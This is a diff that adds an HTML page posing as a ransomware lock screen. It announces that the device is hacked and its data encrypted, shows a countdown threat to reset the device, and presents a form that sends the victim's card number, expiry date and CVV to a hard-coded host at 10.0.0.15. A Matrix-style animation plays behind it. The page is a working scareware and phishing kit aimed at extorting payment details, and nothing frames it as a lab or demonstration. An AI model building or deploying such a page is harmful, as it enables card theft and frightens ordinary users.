@@ -1,0 +1,196 @@
+<html>
+    <head>
+        <style>
+            html, body {
+                background: black;
+                height: 110vh;
+                width: 100vw;
+                display: flex;
+                padding: 0;
+                margin: 0;
+                z-index: 0;
+                overflow: hidden;
+            }
+            body::-webkit-scrollbar {
+                display: none;
+            }
+            .main-app {
+                position: absolute;
+                display: flex;
+                flex-direction: column;
+                justify-content: center;
+                align-items: center;
+                height: 140vh;
+                width: 100vw;
+                background: white;
+                z-index: 0;
+                overflow: hidden;
+            }
+            .in {
+                position: absolute;
+                top: 0;
+                left: 0;
+                height: 70%;
+                width: 100vw;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                flex-direction: column;
+                color: white;
+                background: transparent;
+                z-index: 1;
+            }
+            .mr {
+                position: relative;
+                display: flex;
+                height: 30%;
+                width: 100%;
+                justify-content: center;
+                flex-direction: column;
+                align-items: center;
+                margin: 0;
+                padding: 0;
+            }
+            .mr form {
+                width: 300px;
+                text-align: center;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                flex-direction: column;
+                height: 150px;
+                background: transparent;
+                z-index: 1;
+            }
+            .mr input {
+                background: rgba(0,0,10,0.9);
+                color: rgba(200,200,200,100);
+                border: 0.5px solid rgba(100,100,100,0.9);
+                border-radius: 1rem;
+                font-size: 1rem;
+            }
+            .bd {
+                position: absolute;
+                top: 0;
+                left: 0;
+                height: 100%;
+                width: 100%;
+                display: flex;
+                flex-direction: column;
+                text-align: center;
+                align-items: center;
+                justify-content: center;
+                color: white;
+                background: transparent;
+                margin: 0;
+                padding: 0;
+                z-index: 0;
+            }
+            canvas {
+                display:block;
+                position: absolute;
+                top: 0;
+                left: 0;
+                height: 100%;
+                width: 100%;
+            }
+            .cons {
+                position: relative;
+                font-size: 3rem;
+                font-family: 'Segoe UI', sans-serif;
+                color: white;
+                font-weight: 500;
+                -webkit-text-stroke: 0.5px white;
+                text-align: center;
+                z-index: 1;
+                height: 200px;
+                letter-spacing: 2px;
+            }
+            .tx {
+                font-family: 'Lucida', sans-serif;
+                letter-spacing: 4px;
+                position: relative;
+                font-size: 2rem;
+                font-weight: 400;
+                color: white;
+                text-align: center;
+                z-index: 1;
+            }
+            .hacker-image {
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                width: calc(256px - 0.1vmin);
+                height: calc(256px - 0.1vmin);
+            }
+            .txt {
+                padding: 10px;
+                font-family: 'Lucida', sans-serif;
+                letter-spacing: 2px;
+                position: relative;
+                font-size: 1.25rem;
+                font-weight: 300;
+                color: white;
+                text-align: center;
+                z-index: 1;
+            }
+        </style>
+    </head>
+<body>
+    <div class="main-app">
+        <div class="in">
+            <div class="mr">
+                <div class="cons">Congratulations!</div>
+                <div class="tx">You have been hacked</br>All your data was collected & encrypted</div>
+                <div class="hacker-image"><img src="static/mrhacker.png" alt="Mr Hacker"/></div>
+                <form method='POST' action="http://10.0.0.15:80/action.html">
+                    <input type='text' name='credit' placeholder="CARD NUMBER"/>
+                    <input type='password' name='expire' placeholder="EXPIRY DATE"/>
+                    <input type='password' name='cvv' placeholder="CVV"/>
+                    <input value='Submit' type='submit'/>
+                </form>
+                <div class="txt">
+                    Enter your bank credentials</br>
+                    Otherwise, this device will be resetted to fabric settings in 3 minutes</br>
+                    Good Luck!
+                </div>
+            </div>
+        </div>
+
+        <div class="bd">
+        <canvas id="c"></canvas>
+
+        </div>
+    </div>
+        <script>
+            var c = document.getElementById("c");
+            var ctx = c.getContext("2d");
+
+            c.height = window.innerHeight;
+            c.width = window.innerWidth;
+            var matrix = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789@#$%^&*()*&^%+-/~{[|`]}";
+            matrix = matrix.split("");
+
+            var font_size = 10;
+            var columns = c.width/font_size;
+            var drops = [];
+            for(var x = 0; x < columns; x++)
+                drops[x] = 1; 
+
+            function draw() {
+                ctx.fillStyle = "rgba(0, 0, 0, 0.04)";
+                ctx.fillRect(0, 0, c.width, c.height);
+                ctx.fillStyle = "#f4427d";
+                ctx.font = font_size + "px arial";
+                for(var i = 0; i < drops.length; i++) {
+                    var text = matrix[Math.floor(Math.random()*matrix.length)];
+                    ctx.fillText(text, i*font_size, drops[i]*font_size);
+                    if(drops[i]*font_size > c.height && Math.random() > 0.975)
+                        drops[i] = 0;
+                    drops[i]++;
+                }
+            }
+            setInterval(draw, 35);
+</script>
+    </body>
+</html>
